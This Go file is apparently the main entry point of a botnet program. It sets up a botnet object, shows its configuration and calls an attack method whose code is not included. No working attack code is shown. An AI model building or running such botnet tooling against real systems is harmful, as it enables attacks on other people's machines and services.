package main

import (
	"os"
)

func main() {
	bot := &botnet{}
	bot.init()
	bot.displayConfig()
	bot.attack()
	os.Exit(0)
}
